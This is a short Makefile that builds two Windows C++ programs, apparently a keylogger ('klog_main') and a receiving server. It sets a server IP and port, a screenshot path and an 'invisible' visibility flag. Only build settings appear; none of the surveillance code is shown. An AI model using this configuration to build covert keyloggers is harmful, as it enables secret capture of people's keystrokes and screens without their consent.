SERVER_IP = \"127.0.0.1\"
PORT = 8080
FILEBLOCKSIZE = 128
SCREENSHOTPATH = \"C:\\Users\\aisnd\\Desktop\\Hello.bmp\"

# IPV4 / IPv6
IP_VERSION = IPV4

# visible / invisible
Visibility = invisible

CDefine = -D ${IP_VERSION} -D ${Visibility}
CDefine += -D SERVER_IP=${SERVER_IP} -D PORT=${PORT} -D FILEBLOCKSIZE=${FILEBLOCKSIZE} -D SCREENSHOTPATH=${SCREENSHOTPATH}

CFlags = -lws2_32 -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic -lgdi32 ${CDefine}

all: server klog_main


server: server.cpp
	g++ $< -o $@ $(CFlags)

klog_main: klog_main.cpp
	g++ $< -o $@ $(CFlags)

clean:
	rm server.exe
	rm klog_main.exe
